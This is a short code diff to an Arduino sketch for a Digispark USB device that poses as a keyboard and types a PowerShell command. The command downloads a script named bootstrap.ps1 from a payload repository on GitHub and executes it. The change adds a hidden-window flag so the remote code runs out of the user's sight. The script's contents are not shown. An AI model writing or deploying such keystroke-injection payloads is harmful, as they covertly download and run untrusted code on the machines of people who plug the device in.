@@ -11,7 +11,7 @@ void setup()
     DigiKeyboard.delay(250);
 
     // run command
-    DigiKeyboard.println("powershell -c \"& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 0\"");
+    DigiKeyboard.println("powershell -W H -c \"& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1\"");
 }
 
 void loop()
